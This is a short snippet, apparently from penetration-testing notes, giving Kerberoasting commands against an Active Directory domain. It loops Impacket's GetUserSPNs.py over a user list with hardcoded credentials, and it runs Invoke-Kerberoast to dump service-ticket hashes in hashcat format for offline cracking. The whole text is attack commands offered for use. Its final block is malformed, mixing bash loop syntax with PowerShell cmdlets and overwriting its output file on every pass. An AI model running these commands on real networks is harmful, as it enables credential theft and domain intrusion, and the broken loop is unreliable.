```

If you have a list of users in a file kerberos_users.txt, you can batch request tickets for these users:

bash

for i in $(cat kerberos_users.txt); do
    GetUserSPNs.py -dc-ip $DC -target-domain glb.com -request-user $i -outputfile "kerberoast_$i.log" -debug glb.com/bh77:mysexypassword
done
```

```


Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast

for i in $(cat kerb_n.txt); do
    Invoke-Kerberoast -Identity $i -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
done

```